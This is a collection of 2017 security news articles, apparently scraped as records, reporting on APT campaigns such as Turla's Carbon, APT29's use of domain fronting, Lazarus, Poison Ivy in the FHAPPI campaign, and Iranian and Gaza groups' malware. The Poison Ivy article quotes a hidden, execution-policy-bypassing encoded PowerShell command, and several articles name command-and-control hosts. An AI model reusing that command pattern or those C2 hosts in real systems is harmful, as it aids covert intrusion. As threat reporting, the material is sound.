would be to operate and protect the military\u2019s own IT infrastructure and computer-assisted weapons systems, as well as surveillance of online threats.\u201d reported the Reuters agency.\n\nThe German Government intends to protect its critical infrastructure and its assets from cyber attacks.

In June 2016, researchers from Kaspersky reported that the Turla APT had started using Icedcoffee, a JavaScript payload delivered via macro-enabled Office documents.\n\nLast time the researchers reported Turla\u2018s activities was February 2017, when experts at Kaspersky Lab have discovered a new piece of JavaScript malware linked to the group targeting organizations in Greece, Qatar, and Romania.\n\nTurla has been active since at least 2007, the hackers launched several high-profile attacks against targets worldwide, including the ones aimed at Swiss defense firm RUAG and the U.S. Central Command.\n\nCarbon, aka Pfinet, is once of the tool in the arsenal of the hacking crew, researchers from ESET described it as a lite version of Uroburos.\n\nCarbon is a second-stage backdoor that is typically deployed after the reconnaissance phase of an attack, it has several components, including a dropper, a command and control (C&C) communications element, an orchestrator, and a loader that executes the orchestrator.\n\nThe orchestrator is used to inject the C&C communications library into a legitimate process, and dispatch the tasks received via the C&C library to other bots that are located on the network.\n\n\n\nESET has identified several versions of Carbon compiled last year; the most recent one was compilated on October 21, 2016. The newer versions of the Carbon malware make a massive use of encryption.\n\nAlmost any component is a DLL file, except for the loader, which is an EXE file.\n\n\u201cThe Turla group is known to be painstaking and work in stages, first doing reconnaissance on their victims\u2019 systems before deploying their most sophisticated tools such as Carbon. \n\nA classic Carbon compromise chain starts with a user receiving a spearphishing email or visiting a previously compromised website, typically one that the user visits regularly \u2014 a technique known as a watering hole attack.\u201d reads the analysis shared by ESET.\n\n\u201cAfter a successful attack, a first stage backdoor \u2014 such as Tavdig or Skipper \u2014 is installed on the user machine.

Domain fronting works at the application layer, using HTTPS, to communicate with a forbidden host while appearing to communicate with some other host, permitted by the censor,\u201d as described in a paper published by researchers from the University of California, Berkeley, Psiphon, and Brave New Software.\n\n\u201cThe key idea is the use of different domain names at different layers of communication. One domain appears on the \u201coutside\u201d of an HTTPS request\u2014in the DNS request and TLS Server Name Indication\u2014while another domain appears on the \u201cinside\u201d\u2014in the HTTP Host header, invisible to the censor under HTTPS encryption.\u201d continues the paper.\u201dA censor, unable to distinguish fronted and nonfronted traffic to a domain, must choose between allowing circumvention traffic and blocking the domain entirely, which results in expensive collateral damage\u201d \n\nThe Domain fronting technique is easy to deploy and use and doesn\u2019t require special activities by network intermediaries.\n\nThe APT29 group has used the Domain fronting technique for at least two years, the hackers leveraged the Tor network to communicate with infected machines. In order to disguise Tor traffic as apparently legitimate traffic, the cyberspies used Meek, a Tor plugin that was specific designed to implement the domain fronting technique and allows users to send traffic to Tor inside a harmless-looking HTTPS POST request to google.com.\n\n\n\n\u201cAPT29 has used The Onion Router (TOR) and the TOR domain fronting plugin meek to create a hidden, encrypted network tunnel that appeared to connect to Google services over TLS.\u201d reads the analysis published by FireEye. \u201cThis tunnel provided the attacker remote access to the host system using the Terminal Services (TS), NetBIOS, and Server Message Block (SMB) services, while appearing to be traffic to legitimate websites. The attackers also leveraged a common Windows exploit to access a privileged command shell without authenticating.\u201d\n\nThe attackers installed the Tor client and the Meek plugin on the targeted system by using a PowerShell script and a .bat file.\n\nThe APT29 group leveraged the Sticky Keys exploit to replace the legitimate executable with the Windows Command Prompt (cmd.exe) file and gain a shell on the targeted system with SYSTEM-level privileges. In this way, the attackers were able to execute several commands, including adding new accounts.\n\n\u201cThe attacker executed the PowerShell script C:\\Program Files(x86)\\Google\\start.ps1 to install the TOR services and implement the \u201cSticky Keys\u201d exploit. This script was deleted after execution, and was not recovered.\u201d continues the analysis.\n\nThe script that executes the Sticky Keys exploit is also used to gain persistence on the target machine, it creates a Windows service named \u201cGoogle Update.\u201d\n\n\u201cBy employing a publicly available implementation, they were able to hide their network traffic, with minimal research or development, and with tools that are difficult to attribute.

five additional strains of malware that suggested the involvement of the Lazarus Group in the cyber attacks that targeted the banks.\n\nThe researchers at Symantec discovered that the hacking tools used by the gang share many similarities with the malicious code in the arsenal of the Lazarus APT.\n\nThe activity of the Lazarus Group surged in 2014 and 2015, its members used mostly custom-tailored malware in their attacks and experts that investigated on the crew consider it highly sophisticated.\n\n\u201cSymantec has found evidence that a bank in the Philippines has also been attacked by the group that stole US$81 million from the Bangladesh central bank and attempted to steal over $1 million from the Tien Phong Bank in Vietnam.\u201d reads the analysis published by Symantec last year.\n\nThe experts at Symantec have spotted at least three strains of malware, Backdoor.Fimlis, Backdoor.Fimlis.B, and Backdoor.Contopee, which have been used in targeted attacks against financial institutions.\n\n\u201cSymantec has identified three pieces of malware which were being used in limited targeted attacks against the financial industry in South-East Asia: Backdoor.Fimlis, Backdoor.Fimlis.B, and Backdoor.Contopee.\u201d states Symantec\u201dAt first, it was unclear what the motivation behind these attacks were, however code sharing between Trojan.Banswift (used in the Bangladesh attack used to manipulate SWIFT transactions) and early variants of Backdoor.Contopee provided a connection.\u201d\n\nThe expert Aaron Shelmire from Anomali

discovered five additional pieces of malware containing portions of code shared by Lazarus Group\u2019s strains of malware, including the one used in the several SWIFT attacks, according to Shelmire.\n\nLast week, SWIFT announced it planned to cut off the remaining North Korean banks still connected to its system as concerns about the North Korean nuclear program and missile tests

Russians, their alleged cyber operation is once again under examination.\n\nThe mainstream media is bringing up the news of the F.B.I director who is conducting an investigation regarding the deploying of computer hackers to undermine the presidential campaign.\n\nAll this is happening two weeks after a dump referred as Vault 7 that reportedly the extensive hacking capabilities of the CIA: iPhones, Android devices, smart TVs and the possibility to turn them into surveillance devices.\n\nThen Russian government and US one are deploying their APT groups: are they the only ones?\n\nThat the FHAPPI campaign was really nasty after all, it was clear to everyone: but the fact that the attacker had a political motivation was not immediately understood. Attackers operated with the intent to cause a sort of political scandal.\n\nWe have the reason to believe the attackers aimed to make the opponent losing integrity or popularity in the political landscape.\n\nStates are sponsoring cyber attacks leveraging specific kind of malware, injecting them in the computer of the victims with methods and techniques ever more sophisticated and spying on the victims to gather sensitive information and power further lethal spear phishing attacks.\n\nIt is even more clear that the National CERTs are becoming mandatory in the defence line of any States, they are assuming the role of the front line against such kind of state sponsored activities.\n\nThe real questions are:\n\nActually, the situation is very complex, we have states with quite different cyber capabilities. Many states haven\u2019t an effective posture in cyber security and are not resilient to such kind of attacks.\n\nThe lack of norms of state behavior helps threat actors and rogue states that continue to invest in cyber espionage activities avoiding sanctions of the international community.\n\nLooking at the next G7 Summit that will be held in Italy, we cannot underestimate the great importance of the cyber security issues that will be discussed by participants.\n\nAnyway, at the same meeting we have participants with quite different cyber capabilities and in some cases with a strong long-running cyber partnership, let\u2019s think for example at the Five Eyes Alliance.\n\nUSA, UK, and Canada are members of the Five Eyes alliance, Germany has supported the US surveillance program in past, and these countries are probably the most advanced at the G7.\n\nDo you believe they will accept norms of state behavior?\n\n\n\nBack to the Chinese FHAPPI campaign, we have decided to interview the popular researcher @unixfreaxjp,  head of the notorious MalwareMustDie malware research team.  As usual with few strokes of the brush he will show us a disconcerting reality.\n\nA: I am not at liberty to describe any information of the victim side. But this attack is the prosecution of the long string of cyber attacks occurred in the past and that are targeting the reputation of the targets and their ability to \u201cinfluence\u201d the political dialogue.\nBy the way, the malware formed and wrapped tells a lot about what is happening, let\u2019s try to summarize key findings:\n\nA: The usage of the PowerSploit is an important sign for us, it shows that a vector to inject process under an adjustable permitted privilege can be done in Windows system (and, well, in other OS too).\nBut, this case shows us to be alerted to the abuse by the usage of powershell.exe (which is a good tool). The powershell.exe injected shellcode is all the PoisonIvy malware itself, that was where the fileless works are coming.\nAnd it is not necessarily \u201cby powershell.exe\u201d, if you know what I mean.\nFor APT the countermeasure itself, it is a matter of the action time. We, in security ring in Japan know this. APT is designed not to be easily detected. When you think an APT is spotted and reported, don\u2019t wait until security products releasing the blocking signature, but read reference analysis, historical facts and confirm those all by yourself, is a must for CERT. In this case, Yahoo Incident Team is doing SUPER great response, also our JP-CERT/CC good folks.\n\nA: Many abuses using the malware that is used for the similar purpose nowadays. There is no specific advice except \u201cto keep stay on alert\u201d. Especially if your country is related or targeting to these types of abuse. The attacker(s) will keep on coming, they will improve, this type of attacks can not be stopped by some \u201carrests\u201d, and we will just have to be ready to dissect them in their next level.\n\nAbout the Author\n\nOdisseus is an Independent Security Researcher involved in Italy and worldwide in topics related to hacking, penetration testing, and development.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 FHAPPI Campaign, Cyber espionage)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/apt", "topic_name": "APT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/fhappi-campaign", "topic_name": "FHAPPI Campaign"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/information-warfare", "topic_name": "Information Warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/mmd", "topic_name": "MMD"}]}, {"news_name": "New APT Campaign based on Poison Ivy RAT with C&C in China has been reversed by MalwareMustDie", "news_link": "https://securityaffairs.co/wordpress/57212/apt/poison-ivy-rat-china.html", "title": "New APT Campaign based on Poison Ivy RAT with C&C in China has been reversed by MalwareMustDie\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "March 17, 2017", "body": "Our travel along the great analysis of a fresh, new insidious APT China campaign.\n\nAt the beginning, it seemed always the same story: a Word document probably infected, an ordinary story of phishing and nothing more.\n\nIf we check at the top of the long analysis of MalwareMustDie we can see the pictures of an ordinary mail, with the boring, ordinary infected Office Word attachment, nothing new under the sun.\n\nThe strange fact was that the suspect document was on a common blog web site like Geocities delivering a multi-layered base64 encoded VBScript script which manually decoded at the first layer have given the resulted below:\n\n\n\nFigure 1. The VBScript encoded with \u201cpowershell.exe\u201d command.\n\nThe classical vbscript \u201ccreatebject\u201d instruction is followed by a Powershell command: \u201cpowershell.exe \u2013w hdden \u2013ep bypass \u2013Enc with a long encoded string\u201d\n\nPoweshell? Encoded command? \u201cBypass\u201d option used for what?\n\nSomething not so \u201cordinary nor boring\u201d rises from the underground of the investigation and here the analysis of MalwarareMustDie starts to become interesting and surprising step after step.\n\nDigging into the details of the functions decoded in the other layers of VBScript in a looping process revealed a complex source code fully executable by Powershell: and we have to admit that following MalwareMustDie in his analysis it\u2019s like riding the roller coaster, the same enjoyment.\n\nHere it is an example of the base 64 manually decoded code that revealed another nested base 64 encoded code. The functions represented in the picture are self-explaining as said in the analysis and it is clear that something dangerous is going on the victim computer.\n\n\n\nFigure 2. The VBScript base 64 decoded code.\n\nAfter different loops decoding base 64 layers the result is clear: beyond the Word attachment document, hidden in the VBScript file, there is a long and dangerous script ready to be executed by Powershell: but \u201cwhere I have already seen this source code\u201d?\n\nThe code in the VBScript running the Powershell command is a \u201ccopy pasta\u201d of an infamous malware based on Powershell PowerSploit/CodeExecution PoC code which is publicly available on GitHub, same file, extension .ps1.\n\nHere it is the main web page of the exploit with the documentation:\n\n\n\nFigure 3. The PowerSploit / CodeExecution web page on GitHub.\n\nThe documentation of the exploit states: \u201cInject shellcode into the process ID of your choosing or within the context of the running PowerShell process\u201d. Easy: this is hacking pret-a-porter.\n\nAnd here we have the first Lesson Learnt of this investigation: how big is the damage to the community of the users keeping the malware code publicly available on GitHub: we will not stress enough repeating how would be important not to have this source code ready to use.\n\nBut let give a look to the Shellcode, because the most important task now is reverse it and understand what is the main purpose of its use, why is injected on the computer victims, which technics and mechanisms adopted for doing what, connecting where. The story is getting exciting!\n\nBut again the Shellcode is encoded using base 64: when decoded it appears as reported in the picture below:\n\n\n\nFigure 4. The Shellcode.\n\nThe reverse activity seems to be a long task and again \u2013 surprisingly \u2013 we discover a great trick from MalwareMustDie in order to compile the shellcode and have an executable file to run safely:\n\n\u201cSaving the shellcode data in the .textsection  of the assembly file and the entry point(EP) will be \u201cadjusted\u201d by the compiler during compilation process therefore you can execute this shellcode as a binary PE file. This method is very useful when analysing shellcodes. And by using a Unix environment you can create this PE without risking an infection.\u201d\n\nWe report the figure of the adopted process here:\n\n\n\nFigure 5. How handle the shellcode to build up a useful .exe file\n\nThe result of this process is to have a \u201cbeautiful\u201d stupid-shellcode.exe file ready to run in order to understand the behaviour for further investigations.\n\nRunning the malware discovered the behavior can be discovered: it extracts the information from the victim\u2019s computer calling back its C2 server with the target to perform all the malicious actions. The analysis of the payload behavior has always fascinated and the security researchers can spend days \u201cfollowing the money\u201d.\n\nAt the end it is sure we are fronting the famous \u2013 or infamous \u2013 Poison Ivy.\n\nRunning the Shellcode it is possible to observe that it uses a lot of system calls involving DLLs mostly related to the kernel of the system: and at the first stage of trace-assemby of the Shellcode provides a fake process named userint.exe used to inject the malicious code, that is executed in this way.\n\nHere an image from the MalwareMustDie analysis reported above:\n\n\n\nFigure 6. The fake process userinit.exe created and injected.\n\nThe great knowledge in malware by MalwareMustDie rise up in all his strength: he is able to find many elements that can be traced back to Poison Ivy.\n\nThe combination of the usage of certain DLL, he says, \u201cis showing a typical pattern of the threat too. Moreover, the date stamped in the MUTEX name is mostly used by Poison Ivy\u201c.\n\nThen other operations are performed by the malware:\n\nYes, no doubts that is Poison Ivy.\n\nThe last answer to close the loop is: where is the Command and Control server located?\n\nIf we give a look closer to the WS2_32.DLL we see that there are some interesting calls like:\n\nThese revealed hostname and IP address for the callback to the Command and Control server, which is based in Seul, Korea.\n\n\n\nFigure 7. C&C server based in Korea.\n\nNetwork/BGP Information\u2192\u300c61.97.243.15||4766 | 61.97.243.0/24 | KIXS-AS | KR | kisa.or.kr | KRNIC\u300d\n\nBut looking to the hostname we see that is web.outlooksysm.net on which is possible to invoke a WHOIS command that gives back, among other info, who is the Registrar: is a company based in Shanghai.\n\n\n\nFigure 8. Whois of the C&C server of the Poison Ivy malware.\n\nThe conclusion is that this APT campaign, which utilized multiple accounts on Geocities Japan, leading to the possibility that there is a larger APT campaign being conducted targeting Mongolian victim is\n\nThe information provided here is referred to the MalwareMustDie research and analysis linked above.\n\nThis kind of campaign has been renamed \u201cFree Hosting (pivoted) APT PowerSploit Poison Ivy\u201d (FHAPPI) by the gentleman who provided us the translation from the Japanese language, Mr. El Kentaro, making up very F-Happy to learn new methods and techniques.\n\nAbout the Author\n\nOdisseus is an Independent Security Researcher involved in Italy and worldwide in topics related to hacking, penetration testing, and development.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 APT, Poison Ivy RAT)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/apt", "topic_name": "APT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/poison-ivy-rat", "topic_name": "Poison Ivy RAT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/rat", "topic_name": "RAT"}]}, {"news_name": "UK NCSC warns of cyber attacks powered by Russia against the political system", "news_link": "https://securityaffairs.co/wordpress/57134/intelligence/ncsc-warns-russia-hacking.html", "title": "UK NCSC warns of cyber attacks powered by Russia against the political system\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "March 14, 2017", "body": "The alert was raised by the UK National Cyber Security Center (NCSC) that is informing political parties in the UK to warn about \u201cthe potential for hostile action against the UK political system.\u201d\n\nThe warning doesn\u2019t confirm that Russia is the most dangerous state for political hacking but the intelligence community has no doubts about cyber capabilities of Russians state-sponsored hackers.\n\nIn a separate context, the British Foreign Secretary Boris Johnson explained that there is no evidence of cyber attacks powered by Russian entities against the Brutish politicians and parties.\n\n\u201cWe have no evidence the Russians are actually involved in trying to undermine our democratic processes at the moment. We don\u2019t actually have that evidence. But what we do have is plenty of evidence that the Russians are capable of doing that.\u201d Johnson declared on national television Sunday. Ha also referred the cyber attacks against the French TV TV4Monde and the diversionary strategy adopted by Russian hackers.\n\n \u201cThere is no doubt that they have been up to all sorts of dirty tricks \u2013 bringing down French TV stations; you have seen what happened in the United States where there is no question at all they were involved in the hacking of the Democratic National Convention.\u201d\n\nLast year, the US government accused Russia of cyberattacks against American political organizations, the Department of Homeland Security (DHS) and the Federal Bureau of Investigation (FBI) published a Joint Analysis Report(JAR) that includes information about the tools, infrastructure and TTPs used by the Russian civilian and military intelligence Services (RIS) against United States election.\n\nU.S. Government linked the cyber activity to a Russian threat actor designated as GRIZZLY STEPPE.  It was the first time that the JAR attributes a malicious cyber activity to specific countries or threat actors.\n\nThe fear of possible attacks powered by Russian hackers is shared among multiple European Governments.\n\nIn January, French Defense Minister Le Drian expressed concerns about cyber attacks against defense systems and warns of hacking campaigns on the upcoming elections.\n\nThe Minister warned of possible cyber attacks like the ones that targeted the 2016 US Presidential Election.\n\nIn France, the conservative candidate Francois Fillon has been praised by Russian president Vladimir Putin due to its intention to intensify the relationship with the Kremlin. On the other side, the candidate Marine Le Pen is in total opposition to Russia, for this reason, the experts believe that hackers could target him and his party.\n\nRelations between Russia and France are not good due to the position of President Hollande on the dispute between Russia and Ukraine in the 2014 Crimean Crysis.\n\nPresident Hollande also blamed Russia for war crimes over its bombardment of the Syrian city of Aleppo.\n\nThe Minister is overseeing an overhaul of the cyber-security operations conducted by his Government.\n\nIn November 2016, the Gorman government expressed concerns about possible interference of Russian nation-state hackers with the 2017 German election.\n\n\n\nThe German politicians fear the Kremlin\u2019s cyber capabilities. The alleged Russian interference in the US Presidential election is unleashing a domino effect and insinuating the fear in governments.\n\n\u201cI don\u2019t have any concrete information about the origin of the attacks on the Telekom network,\u201d Chancellor Angela Merkel said on Tuesday in Berlin. \u201cLet me just say that such cyberattacks, or \u2018hybrid attacks\u2019 as they\u2019re known in Russian doctrine, are part of everyday life today, and we need to learn to deal with them.\u201d\n\nThe Germany\u2019s Interior Minister Thomas de Mazi\u00e8re expressed a great concern for explicitly blaming Moscow.\n\n\u201cIt\u2019s possible that we can\u2019t clearly distinguish between criminal activities launched from a certain country and state activities,\u201d Maizi\u00e8re declared at a conference of federal state interior ministers in Saarbr\u00fccken, when asked if Moscow was responsible for the attacks against the German routers.\n\nThe new president of German intelligence service (BND), Bruno Kahl, confirmed that foreign hackers can try to launch cyber attacks in the attempt to \u201cdelegitimize the democratic process\u201d in the country.\n\n\u201cIn an interview with the S\u00fcddeutsche Zeitung newspaper, Bruno Kahl \u2013 the new president of German intelligence service, the BND \u2013 complained about hackers trying to \u201cdelegitimize the democratic process as such\u201d and said he had \u201cindications\u201d that the hacks \u201ccame from certain quarters,\u201d namely Russia. And the Telekom hack is by no means the only attack of its kind in Germany.\u201d reported DW.com.\n\nBack to the warning issued by the GCHQ, in a letter sent to the British political parties, the NCSC chief executive Ciaran Martin invited to stay sharp on cyber attacks against their infrastructure in the attempt to subvert democratic processes in the country.\n\n\u201cYou will be aware of the coverage of events in the United States, Germany and elsewhere reminding us of the potential for hostile action against the UK political system.

Kiev blamed Russian hackers for the power outage it has suffered in December. Hackers also targeted the defense and finance ministries and the State Treasury.\n\n\u201cThere is a global cyber war of Russia against (the) whole world,\u201d President Petro Poroshenko told Reuters in an interview in January at the World Economic Forum in Davos.\n\nTkachuk explained that the cyber attacks leverage the Telebots to infect computers that control infrastructure.\n\nIn December 2016, researchers from security firm ESET discovered that the BlackEnergy hacker group that targeted the Ukrainian grid one year ago, now identified as TeleBots, are targeting Ukrainian banks.\n\n\n\nOn Wednesday, cyber security experts at CyberX announced the discovery of a separate cyber espionage campaign in Ukraine that had compromised more than 60 victims, including an energy ministry, a scientific research institute and a firm that designs remote monitoring systems for oil & gas pipelines.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 TeleBots , Ukraine)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/blackenergy", "topic_name": "BlackEnergy"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructure", "topic_name": "critical infrastructure"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/telebots", "topic_name": "TeleBots"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ukraine", "topic_name": "Ukraine"}]}, {"news_name": "Iranian hackers behind the Magic Hound campaign linked to Shamoon", "news_link": "https://securityaffairs.co/wordpress/56348/intelligence/magic-hound-campaign.html", "title": "Iranian hackers behind the Magic Hound campaign linked to Shamoon\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "February 16, 2017", "body": "Security experts at Palo Alto Networks have discovered a new cyber espionage campaign linked to Iran that targeted several organizations in the Middle East.\n\nThe espionage campaign dubbed Magic Hound, dates back at least mid-2016.

During our analysis, we determined that Komplex was used in a previous attack campaign targeting individuals running OS X that exploited a vulnerability in the MacKeeper antivirus application to deliver Komplex as a payload.\u201d reads the analysis published by PaloAlto in September 2016. \u201cKomplex shares a significant amount of functionality and traits with another tool used by Sofacy \u2013 the Carberp variant that Sofacy had used in previous attack campaigns on systems running Windows. In addition to shared code and functionality, we also discovered Komplex command and control (C2) domains that overlapped with previously identified phishing campaign infrastructures associated with the Sofacy group.\u201d\u201d\n\nThe Komplex malware has numerous similarities with the Carberp trojan, it was improved to gain access on PC and OS X systems and use the same command-and-control server.\n\nThe researchers noticed that Komplex\u2019s C2 domain appleupdate[.]org was not used in the past by the group, while both the apple-iclouds[.]net and itunes-helper[.]net domains have direct ties to the activity of the APT 28.\n\nThe new MAC OS X-Agent leverages domain names similar to the one used by Komplex Trojan, they only differ for the TLD. The researchers noticed identical project path strings inside both the Komplex and X-Agent samples, a circumstance that suggests the involvement of the same development team.\n\n\u201cOther indicators show that today\u2019s sample also reports to a C&C URL that is identical to the Sofacy/APT28/Sednit Komplex OSX Trojan, minus the TLD (apple-[*******].net for Komplex vs apple-[*******].org for Xagent).\u201d states Bitdefender.\n\nSummarizing, the Komplex component discovered in September 2016 has been exclusively used as a downloader and installer for the X-Agent binary.\n\nThe

cyber espionage campaign, according to The Guardian newspaper who cited a diplomatic source that has spoken on condition of anonymity.\n\nAccording to the source, the attack was launched by a nation-state actor, likely Russia.\n\n\u201cRussia is suspected by Italian officials of being behind a sustained hacking attack against the Italian foreign ministry last year that compromised email communications and lasted for many months before it was detected, according to people familiar with the matter.\u201d reported The Guardian.\n\nThe source revealed that after the experts discovered the attack, the foreign ministry has introduced further security measures to improve its online \u201carchitecture\u201d and the internal security. At the time I was writing there is no technical information about the attack neither the way the experts discovered the intrusion.\n\nThe hackers targeted the foreign ministry\u2019s \u201cfield offices\u201d, including embassies and staff members, they used a malware to spy on their systems and exfiltrate sensitive information.\n\n\u201cThe official did not confirm that Moscow was behind the attack. But two other people with knowledge of the attack said the Russian state was believed to have been behind it. The hacking is now the subject of an inquiry by the chief prosecutor in Rome.\u201d continued The Guardian.\n\n\u201cThere were no attacks on the encrypted level. So the information \u2013 delicate, sensitive information \u2013 that is usually shared in this net, which is restricted by code, has never been attacked or part of this attack,\u201d the government official said.\n\nSecurity experts believe that the Russian Government is conducting a wide-range espionage activity in order to gather intelligence information on EU states and NATO members, the list of victims includes France, Germany, the Netherlands and Bulgaria,\n\nRecently France the Defense Minister Le Drian expressed concerns about cyber attacks against defense systems and warns of hacking campaigns launched by Russian hackers on the upcoming elections.\n\nBack to the present, the Italian source, who has close ties to the Foreign Ministry, confirmed that the cyber espionage campaign \u201cdid not affect the encrypted information system used to exchange the most sensitive information\u201d but did affect \u201cemail accounts of ministry employees and the embassies\u201d.\n\nAn Italian government official confirmed that the cyber attack occurred during last spring when Paolo Gentiloni who was serving as foreign minister, and the campaign lasted for more than four months.

Moreover, it reports about threat agents their motivations, and how their practices, tools and techniques have advanced.\u201d read an introduction to the report.\n\nThe ENISA Threat Landscape Report 2016 is an impressive source of data and references to the events that characterized the threat landscape in 2016.\n\nThe vast majority of the attacks was financially and politically motivated, the year 2016 is thus characterized by \u201cthe efficiency of cyber-crime monetization.\u201d Crooks have monetized their effort not only with the illegal activities they conducted but also offering their services through the consolidated model of sale known as \u201ccrime-as-a-service.\u201d\n\nFortunately, we are observing an increasing maturity of defenders when dealing cyber threats and a successful effort of international law enforcement agencies that conducted many operations disrupting criminal organizations.\n\nHowever, attackers are still one step ahead as explained in the report. The advances of defenders have been the result of the superiority of attackers in:\n\nMalware remains the principal cyber-threat in 2016, the number of samples reached ca. 600 million per quarter, mobile malware (reaches a growth of ca. 150%) and ransomware have monopolized the threat landscape. Web based attacks and web application attacks follow malware in the Top 15, no change has been observed respecting 2015.\n\nWeb based attacks include malicious URLs, compromised domains, browser exploits and drive-by attacks.\n\n\u201cWeb based attacks are those that use web components as an attack surface. As web components we understand parts of the web infrastructure, such as web servers, web clients (browsers) content management systems (CMS) and browser extensions\u201d states the report.\n\nThe category of web application attacks includes classic techniques like cross-site scripting and SQL-injection (SQLi) that anyway continues to be a privileged attack vector of threat actors.  In the fourth place there are the Botnets, these infrastructures are an essential component for a large number of cyber attacks.\n\nThe DDoS attacks reached the fourth place, it is the result of extortion activities and the availability in the criminal underground of DDoS-for-hire services that offer to wannabe hackers all the necessary to launch powerful attack.\n\n\n\nThe report also provides an interesting analysis of top threat actors observed in 2016, Cyber-criminals, insiders, cyber spies, hacktivists, cyber fighters, cyber terrorists and script kiddies operate with different techniques, but in many cases the observed an overlap of their TTPs caused by the evolution of the crime-as-service model.\n\nThe ENISA Threat Landscape Report 2016 also associated the various threat to the above threat agents, an interesting exercize that allowed us to better profile the attackers.\n\n\n\nBased on the material ENISA\u2019s experts collected, the report provided our conclusions for policy makers, businesses, and research.\n\n\u201cAs we speak, the cyber-threat landscape is receiving significant high-level attention: it is on the agenda of politicians in the biggest industrial countries. This is a direct consequence of \u2018cyber\u2019 becoming mainstream, in affecting people\u2019s opinions and influencing the political environment of modern societies.

Anyway, at the time of writing the analysis, MacDownload is undetected by virus scanning engines on VirusTotal, while at the time I was writing just a dozen vendors have recognized the bogus Flash Player and Bitdefender apps as a threat.\n\nOnce the MacDownloader infects a device, the malware collects information about the host, including passwords stored in the Keychain.\n\n\u201cMacDownloader seems to be poorly developed and created towards the end of 2016, potentially a first attempt from an amateur developer. In multiple cases, the code used has been copied from elsewhere. The simple activity of downloading the remote file appears to have been sourced from a cheat sheet. The main purpose of MacDownloader seems to be to perform an initial profiling of the infected system and collection of credentials from macOS\u2019s Keychain password manager \u2013 which mirrors the focus of Windows malware developed by the same actors.\u201d reads the analysis published by the security duo.\n\nThe malicious code was first spotted on a fake website of the aerospace firm United Technologies Corporation, that same site that was used in the past to spread a Windows malware and the Browser Exploitation Framework (BeEF).\n\nThe malware researchers linked the MacDownloader with the activity of an Iranian threat actor known as Charming Kitten (aka Newscaster and NewsBeef).\n\nNewscaster group made the headlines in 2014 when experts at iSight issued a report describing the most elaborate net-based spying campaign organized by Iranian hackers using social media.\n\nIranian Hackers used a network of fake accounts (NEWSCASTER network) on principal social media to spy on US officials and political staff worldwide, this is reported in an analysis done by iSIGHT Partners. The Charming Kitten group is also known for the abuse of Open Source Security Tools, including the BeEF.\n\nThe analysis of the malware revealed that the authors have attempted to implement remote update and persistence capabilities, but both features don\u2019t work.\n\n\u201cIt appears that the application contains an unused attempt to install persistent access to the victim host. One segment provides a poorly-implemented shell script to save a response from the C2 and mark it for persistence by writing an entry in the /etc/rc.common file. In theory, every time the infected computer would start up, the shell script would be launched to download a file from a remote location, check if it changed from the previous iteration, and if so execute that new implant.

The Gaza cybergang appears to be politically motivated and has been active since at least 2012, but it has intensified its activity in the Q2 2015.\n\nSecurity experts speculate the group composed of Palestinian militant of Hamas, it also targeted organizations in Europe and the United States.\n\nIn the recent attacks, dubbed DustySky campaign, Gaza Cybergang targeted government organizations with two strains of malware: a downloader called Downeks and a remote access tool (RAT) named QuasarRAT.\n\n\u201cPalo Alto Networks Traps Advanced Endpoint Protection recently prevented recent attacks that we believe are part of a campaign linked to DustySky. DustySky is a campaign which others have attributed to the Gaza Cybergang group, a group that targets government interests in the region.\u201d states the analysis published by PaloAlto Networks.\n\nResearchers noticed many similarities in the TTPs of a recent campaign and the DustySky attacks that were linked to the Gaza Cybergang.\n\nThe experts noticed that the attacks were launched and the malware samples were built on days that coincide with the workweek in the Middle East.\n\n\n\nQuasar is a free and open source RAT that was developed starting from the xRAT malware, the researchers believe that the members of the Gaza Cybergang have customized their own version starting from the source code available on GitHub.\n\nQuasar could be used by attackers to gather information of the target, exfiltrate data and gain the complete control over the machine.\n\nWhile the researchers were analyzing the C&C server used by QuasarRAT discovered it was affected by remote code execution vulnerabilities that could be exploited by a second attacker to take control of the infected machine.\n\n\u201cWith further analysis of the Quasar RAT C2 Server, we uncovered vulnerabilities in the server code, which would allow remote code execution. This might allow a second attacker to install code of their choice \u2013 for example, their own Quasar RAT \u2013 on the original attacker\u2019s server. We refer to this (somewhat ironic) technique as a \u201cDouble Edged Sword Attack\u201d. We did not apply this to any live C2 servers \u2013 we only tested this with our own servers in our lab.\u201d\n\n\u201cIn the lab, we changed our Quasar RAT source code to use the known encryption key, and to send fake victim IP address, City, Country code, Flag, and Username. The Quasar server does not verify the RAT data, and displays this data in the RAT Server GUI when the RAT is executed and connects to the server. We found this could be used to supply compelling \u201cvictim data\u201d to convince the attacker to connect to this \u201cvictim\u201d via the GUI.\u201d\n\nAs for Downeks, experts discovered that attackers used new versions of the malware written in .NET while the earlier samples had been written in native code. The malware is used to deliver other threats on the infected machine and also for reconnaissance activities (i.e. Check the infected system for the presence of security solutions)\n\nThe samples analyzed by the experts were used to hit Hebrew-speaking targets.\n\nI suggest you read the report published by 